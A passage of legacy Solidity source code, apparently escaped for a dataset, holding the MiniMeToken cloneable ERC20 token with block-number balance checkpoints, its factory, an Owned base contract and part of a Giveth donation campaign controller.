address public controller;\r\r\n\r\r\n    function Controlled() { controller = msg.sender;}\r\r\n\r\r\n    \/\/\/ @notice Changes the controller of the contract\r\r\n    \/\/\/ @param _newController The new controller of the contract\r\r\n    function changeController(address _newController) onlyController {\r\r\n        controller = _newController;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract ApproveAndCallFallBack {\r\r\n    function receiveApproval(address from, uint256 _amount, address _token, bytes _data);\r\r\n}\r\r\n\r\r\n\/\/\/ @dev The actual token contract, the default controller is the msg.sender\r\r\n\/\/\/  that deploys the contract, so usually this token will be deployed by a\r\r\n\/\/\/  token controller contract, which Giveth will call a \"Campaign\"\r\r\ncontract MiniMeToken is Controlled {\r\r\n\r\r\n    string public name;                \/\/The Token&#39;s name: e.g. DigixDAO Tokens\r\r\n    uint8 public decimals;             \/\/Number of decimals of the smallest unit\r\r\n    string public symbol;              \/\/An identifier: e.g. REP\r\r\n    string public version = &#39;MMT_0.1&#39;; \/\/An arbitrary versioning scheme\r\r\n\r\r\n\r\r\n    \/\/\/ @dev `Checkpoint` is the structure that attaches a block number to a\r\r\n    \/\/\/  given value, the block number attached is the one that last changed the\r\r\n    \/\/\/  value\r\r\n    struct  Checkpoint {\r\r\n\r\r\n        \/\/ `fromBlock` is the block number that the value was generated from\r\r\n        uint128 fromBlock;\r\r\n\r\r\n        \/\/ `value` is the amount of tokens at a specific block number\r\r\n        uint128 value;\r\r\n    }\r\r\n\r\r\n    \/\/ `parentToken` is the Token address that was cloned to produce this token;\r\r\n    \/\/  it will be 0x0 for a token that was not cloned\r\r\n    MiniMeToken public parentToken;\r\r\n\r\r\n    \/\/ `parentSnapShotBlock` is the block number from the Parent Token that was\r\r\n    \/\/  used to determine the initial distribution of the Clone Token\r\r\n    uint public parentSnapShotBlock;\r\r\n\r\r\n    \/\/ `creationBlock` is the block number that the Clone Token was created\r\r\n    uint public creationBlock;\r\r\n\r\r\n    \/\/ `balances` is the map that tracks the balance of each address, in this\r\r\n    \/\/  contract when the balance changes the block number that the change\r\r\n    \/\/  occurred is also included in the map\r\r\n    mapping (address => Checkpoint[]) balances;\r\r\n\r\r\n    \/\/ `allowed` tracks any extra transfer rights as in all ERC20 tokens\r\r\n    mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n    \/\/ Tracks the history of the `totalSupply` of the token\r\r\n    Checkpoint[] totalSupplyHistory;\r\r\n\r\r\n    \/\/ Flag that determines if the token is transferable or not.\r\r\n    bool public transfersEnabled;\r\r\n\r\r\n    \/\/ The factory used to create new clone tokens\r\r\n    MiniMeTokenFactory public tokenFactory;\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Constructor\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Constructor to create a MiniMeToken\r\r\n    \/\/\/ @param _tokenFactory The address of the MiniMeTokenFactory contract that\r\r\n    \/\/\/  will create the Clone token contracts, the token factory needs to be\r\r\n    \/\/\/  deployed first\r\r\n    \/\/\/ @param _parentToken Address of the parent token, set to 0x0 if it is a\r\r\n    \/\/\/  new token\r\r\n    \/\/\/ @param _parentSnapShotBlock Block of the parent token that will\r\r\n    \/\/\/  determine the initial distribution of the clone token, set to 0 if it\r\r\n    \/\/\/  is a new token\r\r\n    \/\/\/ @param _tokenName Name of the new token\r\r\n    \/\/\/ @param _decimalUnits Number of decimals of the new token\r\r\n    \/\/\/ @param _tokenSymbol Token Symbol for the new token\r\r\n    \/\/\/ @param _transfersEnabled If true, tokens will be able to be transferred\r\r\n    function MiniMeToken(\r\r\n        address _tokenFactory,\r\r\n        address _parentToken,\r\r\n        uint _parentSnapShotBlock,\r\r\n        string _tokenName,\r\r\n        uint8 _decimalUnits,\r\r\n        string _tokenSymbol,\r\r\n        bool _transfersEnabled\r\r\n    ) {\r\r\n        tokenFactory = MiniMeTokenFactory(_tokenFactory);\r\r\n        name = _tokenName;                                 \/\/ Set the name\r\r\n        decimals = _decimalUnits;                          \/\/ Set the decimals\r\r\n        symbol = _tokenSymbol;                             \/\/ Set the symbol\r\r\n        parentToken = MiniMeToken(_parentToken);\r\r\n        parentSnapShotBlock = _parentSnapShotBlock;\r\r\n        transfersEnabled = _transfersEnabled;\r\r\n        creationBlock = block.number;\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ ERC20 Methods\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Send `_amount` tokens to `_to` from `msg.sender`\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return Whether the transfer was successful or not\r\r\n    function transfer(address _to, uint256 _amount) returns (bool success) {\r\r\n        if (!transfersEnabled) throw;\r\r\n        return doTransfer(msg.sender, _to, _amount);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Send `_amount` tokens to `_to` from `_from` on the condition it\r\r\n    \/\/\/  is approved by `_from`\r\r\n    \/\/\/ @param _from The address holding the tokens being transferred\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return True if the transfer was successful\r\r\n    function transferFrom(address _from, address _to, uint256 _amount\r\r\n    ) returns (bool success) {\r\r\n\r\r\n        \/\/ The controller of this contract can move tokens around at will,\r\r\n        \/\/  this is important to recognize! Confirm that you trust the\r\r\n        \/\/  controller of this contract, which in most situations should be\r\r\n        \/\/  another open source smart contract or 0x0\r\r\n        if (msg.sender != controller) {\r\r\n            if (!transfersEnabled) throw;\r\r\n\r\r\n            \/\/ The standard ERC 20 transferFrom functionality\r\r\n            if (allowed[_from][msg.sender] < _amount) return false;\r\r\n            allowed[_from][msg.sender] -= _amount;\r\r\n        }\r\r\n        return doTransfer(_from, _to, _amount);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This is the actual transfer function in the token contract, it can\r\r\n    \/\/\/  only be called by other functions in this contract.\r\r\n    \/\/\/ @param _from The address holding the tokens being transferred\r\r\n    \/\/\/ @param _to The address of the recipient\r\r\n    \/\/\/ @param _amount The amount of tokens to be transferred\r\r\n    \/\/\/ @return True if the transfer was successful\r\r\n    function doTransfer(address _from, address _to, uint _amount\r\r\n    ) internal returns(bool) {\r\r\n\r\r\n           if (_amount == 0) {\r\r\n               return true;\r\r\n           }\r\r\n\r\r\n           if (parentSnapShotBlock >= block.number) throw;\r\r\n\r\r\n           \/\/ Do not allow transfer to 0x0 or the token contract itself\r\r\n           if ((_to == 0) || (_to == address(this))) throw;\r\r\n\r\r\n           \/\/ If the amount being transfered is more than the balance of the\r\r\n           \/\/  account the transfer returns false\r\r\n           var previousBalanceFrom = balanceOfAt(_from, block.number);\r\r\n           if (previousBalanceFrom < _amount) {\r\r\n               return false;\r\r\n           }\r\r\n\r\r\n           \/\/ Alerts the token controller of the transfer\r\r\n           if (isContract(controller)) {\r\r\n               if (!TokenController(controller).onTransfer(_from, _to, _amount))\r\r\n               throw;\r\r\n           }\r\r\n\r\r\n           \/\/ First update the balance array with the new value for the address\r\r\n           \/\/  sending the tokens\r\r\n           updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\r\r\n\r\r\n           \/\/ Then update the balance array with the new value for the address\r\r\n           \/\/  receiving the tokens\r\r\n           var previousBalanceTo = balanceOfAt(_to, block.number);\r\r\n           if (previousBalanceTo + _amount < previousBalanceTo) throw; \/\/ Check for overflow\r\r\n           updateValueAtNow(balances[_to], previousBalanceTo + _amount);\r\r\n\r\r\n           \/\/ An event to make the transfer easy to find on the blockchain\r\r\n           Transfer(_from, _to, _amount);\r\r\n\r\r\n           return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @param _owner The address that&#39;s balance is being requested\r\r\n    \/\/\/ @return The balance of `_owner` at the current block\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balanceOfAt(_owner, block.number);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to spend `_amount` tokens on\r\r\n    \/\/\/  its behalf. This is a modified version of the ERC20 approve function\r\r\n    \/\/\/  to be a little bit safer\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @param _amount The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return True if the approval was successful\r\r\n    function approve(address _spender, uint256 _amount) returns (bool success) {\r\r\n        if (!transfersEnabled) throw;\r\r\n\r\r\n        \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n        \/\/  allowance to zero by calling `approve(_spender,0)` if it is not\r\r\n        \/\/  already 0 to mitigate the race condition described here:\r\r\n        \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n        if ((_amount!=0) && (allowed[msg.sender][_spender] !=0)) throw;\r\r\n\r\r\n        \/\/ Alerts the token controller of the approve function call\r\r\n        if (isContract(controller)) {\r\r\n            if (!TokenController(controller).onApprove(msg.sender, _spender, _amount))\r\r\n                throw;\r\r\n        }\r\r\n\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This function makes it easy to read the `allowed[]` map\r\r\n    \/\/\/ @param _owner The address of the account that owns the token\r\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\r\n    \/\/\/ @return Amount of remaining tokens of _owner that _spender is allowed\r\r\n    \/\/\/  to spend\r\r\n    function allowance(address _owner, address _spender\r\r\n    ) constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice `msg.sender` approves `_spender` to send `_amount` tokens on\r\r\n    \/\/\/  its behalf, and then a function is triggered in the contract that is\r\r\n    \/\/\/  being approved, `_spender`. This allows users to use their tokens to\r\r\n    \/\/\/  interact with contracts in one function call instead of two\r\r\n    \/\/\/ @param _spender The address of the contract able to transfer the tokens\r\r\n    \/\/\/ @param _amount The amount of tokens to be approved for transfer\r\r\n    \/\/\/ @return True if the function call was successful\r\r\n    function approveAndCall(address _spender, uint256 _amount, bytes _extraData\r\r\n    ) returns (bool success) {\r\r\n        if (!approve(_spender, _amount)) throw;\r\r\n\r\r\n        ApproveAndCallFallBack(_spender).receiveApproval(\r\r\n            msg.sender,\r\r\n            _amount,\r\r\n            this,\r\r\n            _extraData\r\r\n        );\r\r\n\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This function makes it easy to get the total number of tokens\r\r\n    \/\/\/ @return The total number of tokens\r\r\n    function totalSupply() constant returns (uint) {\r\r\n        return totalSupplyAt(block.number);\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Query balance and totalSupply in History\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @dev Queries the balance of `_owner` at a specific `_blockNumber`\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @param _blockNumber The block number when the balance is queried\r\r\n    \/\/\/ @return The balance at `_blockNumber`\r\r\n    function balanceOfAt(address _owner, uint _blockNumber) constant\r\r\n        returns (uint) {\r\r\n\r\r\n        \/\/ These next few lines are used when the balance of the token is\r\r\n        \/\/  requested before a check point was ever created for this token, it\r\r\n        \/\/  requires that the `parentToken.balanceOfAt` be queried at the\r\r\n        \/\/  genesis block for that token as this contains initial balance of\r\r\n        \/\/  this token\r\r\n        if ((balances[_owner].length == 0)\r\r\n            || (balances[_owner][0].fromBlock > _blockNumber)) {\r\r\n            if (address(parentToken) != 0) {\r\r\n                return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\r\r\n            } else {\r\r\n                \/\/ Has no parent\r\r\n                return 0;\r\r\n            }\r\r\n\r\r\n        \/\/ This will return the expected balance during normal situations\r\r\n        } else {\r\r\n            return getValueAt(balances[_owner], _blockNumber);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Total amount of tokens at a specific `_blockNumber`.\r\r\n    \/\/\/ @param _blockNumber The block number when the totalSupply is queried\r\r\n    \/\/\/ @return The total amount of tokens at `_blockNumber`\r\r\n    function totalSupplyAt(uint _blockNumber) constant returns(uint) {\r\r\n\r\r\n        \/\/ These next few lines are used when the totalSupply of the token is\r\r\n        \/\/  requested before a check point was ever created for this token, it\r\r\n        \/\/  requires that the `parentToken.totalSupplyAt` be queried at the\r\r\n        \/\/  genesis block for this token as that contains totalSupply of this\r\r\n        \/\/  token at this block number.\r\r\n        if ((totalSupplyHistory.length == 0)\r\r\n            || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\r\r\n            if (address(parentToken) != 0) {\r\r\n                return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\r\r\n            } else {\r\r\n                return 0;\r\r\n            }\r\r\n\r\r\n        \/\/ This will return the expected totalSupply during normal situations\r\r\n        } else {\r\r\n            return getValueAt(totalSupplyHistory, _blockNumber);\r\r\n        }\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Clone Token Method\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Creates a new clone token with the initial distribution being\r\r\n    \/\/\/  this token at `_snapshotBlock`\r\r\n    \/\/\/ @param _cloneTokenName Name of the clone token\r\r\n    \/\/\/ @param _cloneDecimalUnits Number of decimals of the smallest unit\r\r\n    \/\/\/ @param _cloneTokenSymbol Symbol of the clone token\r\r\n    \/\/\/ @param _snapshotBlock Block when the distribution of the parent token is\r\r\n    \/\/\/  copied to set the initial distribution of the new clone token;\r\r\n    \/\/\/  if the block is zero than the actual block, the current block is used\r\r\n    \/\/\/ @param _transfersEnabled True if transfers are allowed in the clone\r\r\n    \/\/\/ @return The address of the new MiniMeToken Contract\r\r\n    function createCloneToken(\r\r\n        string _cloneTokenName,\r\r\n        uint8 _cloneDecimalUnits,\r\r\n        string _cloneTokenSymbol,\r\r\n        uint _snapshotBlock,\r\r\n        bool _transfersEnabled\r\r\n        ) returns(address) {\r\r\n        if (_snapshotBlock == 0) _snapshotBlock = block.number;\r\r\n        MiniMeToken cloneToken = tokenFactory.createCloneToken(\r\r\n            this,\r\r\n            _snapshotBlock,\r\r\n            _cloneTokenName,\r\r\n            _cloneDecimalUnits,\r\r\n            _cloneTokenSymbol,\r\r\n            _transfersEnabled\r\r\n            );\r\r\n\r\r\n        cloneToken.changeController(msg.sender);\r\r\n\r\r\n        \/\/ An event to make the token easy to find on the blockchain\r\r\n        NewCloneToken(address(cloneToken), _snapshotBlock);\r\r\n        return address(cloneToken);\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Generate and destroy tokens\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Generates `_amount` tokens that are assigned to `_owner`\r\r\n    \/\/\/ @param _owner The address that will be assigned the new tokens\r\r\n    \/\/\/ @param _amount The quantity of tokens generated\r\r\n    \/\/\/ @return True if the tokens are generated correctly\r\r\n    function generateTokens(address _owner, uint _amount\r\r\n    ) onlyController returns (bool) {\r\r\n        uint curTotalSupply = getValueAt(totalSupplyHistory, block.number);\r\r\n        if (curTotalSupply + _amount < curTotalSupply) throw; \/\/ Check for overflow\r\r\n        updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\r\r\n        var previousBalanceTo = balanceOf(_owner);\r\r\n        if (previousBalanceTo + _amount < previousBalanceTo) throw; \/\/ Check for overflow\r\r\n        updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\r\r\n        Transfer(0, _owner, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/\/ @notice Burns `_amount` tokens from `_owner`\r\r\n    \/\/\/ @param _owner The address that will lose the tokens\r\r\n    \/\/\/ @param _amount The quantity of tokens to burn\r\r\n    \/\/\/ @return True if the tokens are burned correctly\r\r\n    function destroyTokens(address _owner, uint _amount\r\r\n    ) onlyController returns (bool) {\r\r\n        uint curTotalSupply = getValueAt(totalSupplyHistory, block.number);\r\r\n        if (curTotalSupply < _amount) throw;\r\r\n        updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\r\r\n        var previousBalanceFrom = balanceOf(_owner);\r\r\n        if (previousBalanceFrom < _amount) throw;\r\r\n        updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\r\r\n        Transfer(_owner, 0, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Enable tokens transfers\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\r\r\n    \/\/\/ @notice Enables token holders to transfer their tokens freely if true\r\r\n    \/\/\/ @param _transfersEnabled True if transfers are allowed in the clone\r\r\n    function enableTransfers(bool _transfersEnabled) onlyController {\r\r\n        transfersEnabled = _transfersEnabled;\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Internal helper functions to query and set a value in a snapshot array\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @dev `getValueAt` retrieves the number of tokens at a given block number\r\r\n    \/\/\/ @param checkpoints The history of values being queried\r\r\n    \/\/\/ @param _block The block number to retrieve the value at\r\r\n    \/\/\/ @return The number of tokens being queried\r\r\n    function getValueAt(Checkpoint[] storage checkpoints, uint _block\r\r\n    ) constant internal returns (uint) {\r\r\n        if (checkpoints.length == 0) return 0;\r\r\n\r\r\n        \/\/ Shortcut for the actual value\r\r\n        if (_block >= checkpoints[checkpoints.length-1].fromBlock)\r\r\n            return checkpoints[checkpoints.length-1].value;\r\r\n        if (_block < checkpoints[0].fromBlock) return 0;\r\r\n\r\r\n        \/\/ Binary search of the value in the array\r\r\n        uint min = 0;\r\r\n        uint max = checkpoints.length-1;\r\r\n        while (max > min) {\r\r\n            uint mid = (max + min + 1)\/ 2;\r\r\n            if (checkpoints[mid].fromBlock<=_block) {\r\r\n                min = mid;\r\r\n            } else {\r\r\n                max = mid-1;\r\r\n            }\r\r\n        }\r\r\n        return checkpoints[min].value;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev `updateValueAtNow` used to update the `balances` map and the\r\r\n    \/\/\/  `totalSupplyHistory`\r\r\n    \/\/\/ @param checkpoints The history of data being updated\r\r\n    \/\/\/ @param _value The new number of tokens\r\r\n    function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\r\r\n    ) internal  {\r\r\n        if ((checkpoints.length == 0)\r\r\n        || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\r\r\n               Checkpoint newCheckPoint = checkpoints[ checkpoints.length++ ];\r\r\n               newCheckPoint.fromBlock =  uint128(block.number);\r\r\n               newCheckPoint.value = uint128(_value);\r\r\n           } else {\r\r\n               Checkpoint oldCheckPoint = checkpoints[checkpoints.length-1];\r\r\n               oldCheckPoint.value = uint128(_value);\r\r\n           }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Internal function to determine if an address is a contract\r\r\n    \/\/\/ @param _addr The address being queried\r\r\n    \/\/\/ @return True if `_addr` is a contract\r\r\n    function isContract(address _addr) constant internal returns(bool) {\r\r\n        uint size;\r\r\n        if (_addr == 0) return false;\r\r\n        assembly {\r\r\n            size := extcodesize(_addr)\r\r\n        }\r\r\n        return size>0;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Helper function to return a min betwen the two uints\r\r\n    function min(uint a, uint b) internal returns (uint) {\r\r\n        return a < b ? a : b;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice The fallback function: If the contract&#39;s controller has not been\r\r\n    \/\/\/  set to 0, then the `proxyPayment` method is called which relays the\r\r\n    \/\/\/  ether and creates tokens as described in the token controller contract\r\r\n    function ()  payable {\r\r\n        if (isContract(controller)) {\r\r\n            if (! TokenController(controller).proxyPayment.value(msg.value)(msg.sender))\r\r\n                throw;\r\r\n        } else {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice This method can be used by the controller to extract mistakenly\r\r\n    \/\/\/  sent tokens to this contract.\r\r\n    \/\/\/ @param _token The address of the token contract that you want to recover\r\r\n    \/\/\/  set to 0 in case you want to extract ether.\r\r\n    function claimTokens(address _token) onlyController {\r\r\n        if (_token == 0x0) {\r\r\n            controller.transfer(this.balance);\r\r\n            return;\r\r\n        }\r\r\n\r\r\n        ERC20Token token = ERC20Token(_token);\r\r\n        uint balance = token.balanceOf(this);\r\r\n        token.transfer(controller, balance);\r\r\n        ClaimedTokens(_token, controller, balance);\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Events\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n    event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _amount);\r\r\n    event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\r\r\n    event Approval(\r\r\n        address indexed _owner,\r\r\n        address indexed _spender,\r\r\n        uint256 _amount\r\r\n        );\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ MiniMeTokenFactory\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\/\/\/ @dev This contract is used to generate clone contracts from a contract.\r\r\n\/\/\/  In solidity this is the way to create a contract from a contract of the\r\r\n\/\/\/  same class\r\r\ncontract MiniMeTokenFactory {\r\r\n\r\r\n    \/\/\/ @notice Update the DApp by creating a new token with new functionalities\r\r\n    \/\/\/  the msg.sender becomes the controller of this clone token\r\r\n    \/\/\/ @param _parentToken Address of the token being cloned\r\r\n    \/\/\/ @param _snapshotBlock Block of the parent token that will\r\r\n    \/\/\/  determine the initial distribution of the clone token\r\r\n    \/\/\/ @param _tokenName Name of the new token\r\r\n    \/\/\/ @param _decimalUnits Number of decimals of the new token\r\r\n    \/\/\/ @param _tokenSymbol Token Symbol for the new token\r\r\n    \/\/\/ @param _transfersEnabled If true, tokens will be able to be transferred\r\r\n    \/\/\/ @return The address of the new token contract\r\r\n    function createCloneToken(\r\r\n        address _parentToken,\r\r\n        uint _snapshotBlock,\r\r\n        string _tokenName,\r\r\n        uint8 _decimalUnits,\r\r\n        string _tokenSymbol,\r\r\n        bool _transfersEnabled\r\r\n    ) returns (MiniMeToken) {\r\r\n        MiniMeToken newToken = new MiniMeToken(\r\r\n            this,\r\r\n            _parentToken,\r\r\n            _snapshotBlock,\r\r\n            _tokenName,\r\r\n            _decimalUnits,\r\r\n            _tokenSymbol,\r\r\n            _transfersEnabled\r\r\n            );\r\r\n\r\r\n        newToken.changeController(msg.sender);\r\r\n        return newToken;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ @dev `Owned` is a base level contract that assigns an `owner` that can be\r\r\n\/\/\/  later changed\r\r\ncontract Owned {\r\r\n    \/\/\/ @dev `owner` is the only address that can call a function with this\r\r\n    \/\/\/ modifier\r\r\n    modifier onlyOwner { if (msg.sender != owner) throw; _; }\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    \/\/\/ @notice The Constructor assigns the message sender to be `owner`\r\r\n    function Owned() { owner = msg.sender;}\r\r\n\r\r\n    \/\/\/ @notice `owner` can step down and assign some other address to this role\r\r\n    \/\/\/ @param _newOwner The address of the new owner. 0x0 can be used to create\r\r\n    \/\/\/  an unowned neutral vault, however that cannot be undone\r\r\n    function changeOwner(address _newOwner) onlyOwner {\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ @dev This is designed to control the issuance of a MiniMe Token for a\r\r\n\/\/\/  non-profit Campaign. This contract effectively dictates the terms of the\r\r\n\/\/\/  funding round.\r\r\n\r\r\ncontract GivethCampaign is TokenController, Owned {\r\r\n\r\r\n    uint public startFundingTime;       \/\/ In UNIX Time Format\r\r\n    uint public endFundingTime;         \/\/ In UNIX Time Format\r\r\n    uint public maximumFunding;         \/\/ In wei\r\r\n    uint public totalCollected;         \/\/ In wei\r\r\n    MiniMeToken public tokenContract;   \/\/ The new token for this Campaign\r\r\n    address public vaultAddress;        \/\/ The address to hold the funds donated\r\r\n\r\r\n\/\/\/ @notice &#39;GivethCampaign()&#39; initiates the Campaign by setting its funding\r\r\n\/\/\/ parameters\r\r\n\/\/\/ @dev There are several checks to make sure the parameters are acceptable\r\r\n\/\/\/ @param _startFundingTime The UNIX time that the Campaign will be able to\r\r\n\/\/\/ start receiving funds\r\r\n\/\/\/ @param _endFundingTime The UNIX time that the Campaign will stop being able\r\r\n\/\/\/ to receive funds\r\r\n\/\/\/ @param _maximumFunding In wei, the Maximum amount that the Campaign can\r\r\n\/\/\/ receive (currently the max is set at 10,000 ETH for the beta)\r\r\n\/\/\/ @param _vaultAddress The address that will store the donated funds\r\r\n\/\/\/ @param _tokenAddress Address of the token contract this contract controls\r\r\n\r\r\n    function GivethCampaign(\r\r\n        uint _startFundingTime,\r\r\n        uint _endFundingTime,\r\r\n        uint _maximumFunding,\r\r\n        address _vaultAddress,\r\r\n        address _tokenAddress\r\r\n\r\r\n    ) {\r\r\n        if ((_endFundingTime < now) ||                \/\/ Cannot end in the past\r\r\n            (_endFundingTime <= _startFundingTime) ||\r\r\n            (_maximumFunding > 10000000 ether) ||        \/\/ The Beta is limited\r\r\n            (_vaultAddress == 0))                     \/\/ To prevent burning ETH\r\r\n            {\r\r\n            throw;\r\r\n            }\r\r\n        startFundingTime = _startFundingTime;\r\r\n        endFundingTime = _endFundingTime;\r\r\n        maximumFunding = _maximumFunding;\r\r\n        tokenContract = MiniMeToken(_tokenAddress);\/\/ The Deployed Token Contract\r\r\n        vaultAddress = _vaultAddress;\r\r\n    }\r\r\n\r\r\n\/\/\/ @dev The fallback function is called when ether is sent to the contract, it\r\r\n\/\/\/ simply calls `doPayment()` with the address that sent the ether as the\r\r\n\/\/\/ `_owner`. Payable is a required solidity modifier for functions to receive\r\r\n\/\/\/ ether, without this modifier functions will throw if ether is sent to them\r\r\n\r\r\n    function ()  payable {\r\r\n        doPayment(msg.sender);\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ TokenController interface\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\/\/\/ @notice `proxyPayment()` allows the caller to send ether to the Campaign and\r\r\n\/\/\/ have the tokens created in an address of their choosing\r\r\n\/\/\/ @param _owner The address that will hold the newly created tokens\r\r\n\r\r\n    function proxyPayment(address _owner) payable returns(bool) {\r\r\n        doPayment(_owner);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice Notifies the controller about a transfer, for this Campaign all\r\r\n\/\/\/  transfers are allowed by default and no extra notifications are needed\r\r\n\/\/\/ @param _from The origin of the transfer\r\r\n\/\/\/ @param _to The destination of the transfer\r\r\n\/\/\/ @param _amount The amount of the transfer\r\r\n\/\/\/ @return False if the controller does not authorize the transfer\r\r\n    function onTransfer(address _from, address _to, uint _amount) returns(bool) {\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice Notifies the controller about an approval, for this Campaign all\r\r\n\/\/\/  approvals are allowed by default and no extra notifications are needed\r\r\n\/\/\/ @param _owner The address that calls `approve()`\r\r\n\/\/\/ @param _spender The spender in the `approve()` call\r\r\n\/\/\/ @param _amount The amount in the `approve()` call\r\r\n\/\/\/ @return False if the controller does not authorize the approval\r\r\n    function onApprove(address _owner, address _spender, uint _amount)\r\r\n        returns(bool)\r\r\n    {\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/ @dev `doPayment()` is an internal function that sends the ether that this\r\r\n\/\/\/  contract receives to the `vault` and creates tokens in the address of the\r\r\n\/\/\/  `_owner` assuming the Campaign is still accepting funds\r\r\n\/\/\/ @param _owner The address that will hold the newly created tokens\r\r\n\r\r\n    function doPayment(address _owner) internal {\r\r\n\r\r\n\/\/ First check that the Campaign is allowed to receive this donation\r\r\n        if ((now<startFundingTime) ||\r\r\n            (now>endFundingTime) ||\r\r\n            (tokenContract.controller() == 0) ||           \/\/ Extra check\r\r\n            (msg.value == 0) ||\r\r\n            (totalCollected + msg.value > maximumFunding))\r\r\n        {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n\/\/Track how much the Campaign has collected\r\r\n        totalCollected += msg.value;\r\r\n\r\r\n\/\/Send the ether to the vault\r\r\n        if (!vaultAddress.send(msg.value)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n\/\/ Creates an equal amount of tokens as ether sent. The new tokens are created\r\r\n\/\/  in the `_owner` address\r\r\n        if (!tokenContract.generateTokens(_owner, msg.value)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        return;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice `finalizeFunding()` ends the Campaign by calling setting the\r\r\n\/\/\/  controller to 0, thereby ending the issuance of new tokens and stopping the\r\r\n\/\/\/  Campaign from receiving more ether\r\r\n\/\/\/ @dev 